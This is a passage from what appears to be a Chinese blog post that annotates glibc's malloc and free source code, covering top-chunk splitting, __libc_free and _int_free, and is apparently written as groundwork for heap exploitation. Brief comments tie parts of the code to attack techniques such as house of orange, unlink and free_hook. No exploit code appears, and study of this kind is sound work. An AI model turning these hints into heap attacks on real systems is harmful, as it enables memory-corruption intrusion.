remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>largebin部分,依照smallest-first,best-fit原则寻找chunk</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果都不存在的话,则从topchunk进行且切割,若topchunk的大小不符合,则调用sysmalloc,此函数会free掉topchunk,然后申请新的topchunk<code>(house of orange)</code></li>
<li>同时也可以看出来,topchunk其实也是一个chunk</li>
</ul>
<h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem) <span class="comment">//传入一个指针</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)<span class="comment">//free_hook</span></span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;<span class="comment">//free一个0的时候直接return</span></span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);<span class="comment">//将数据指针转换成chunk指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>后续的部分就简写一下了,因为原理都差不多</li>
<li>这里没什么好说的,类似malloc,先检测free hook是否为空,将数据指针转成chunk指针,<code>free(0)</code>时的事情,最后根据是否为mmap的情况决定是否调用_int_free,一般正常的都会直接调用intfree</li>
<li>记住传入的参数,arena的指针,chunk指针和一个0</li>
</ul>
<h2 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don't abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到参数,一开始传入的0是lock,其余的都和malloc差不多,后面的是检测是指针否溢出,size是否符合标准</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">			  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">	   getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (!have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">	    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fail)</span><br><span class="line">	  malloc_printerr (<span class="string">"free(): invalid next size (fast)"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">	p-&gt;fd = old;</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	     add (i.e., double free).  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	    malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">	  p-&gt;fd = old2 = old;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">	     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">"invalid fastbin entry (free)"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当size小于max fast size的时候,检测nextchunk是否为top,非top的时候则继续进行代码块的代码</li>
<li>后边是一些锁的操作,这些以后再分析,过了这里就是一个单链表插入表头的操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we're single-threaded, don't lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">"double free or corruption (top)"</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (<span class="string">"double free or corruption (out)"</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">"free(): invalid next size (normal)"</span>);</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//前向合并,一般的unlink打法</span></span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//不相邻topchunk且前向chunk inuse.</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//获取free chunk的next chunk的next chunk的inuse位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果为0,前向合并nextchunk</span></span><br><span class="line">	unlink_chunk (av, nextchunk);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//否则clear next next inuse位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av); <span class="comment">//插入unsorted 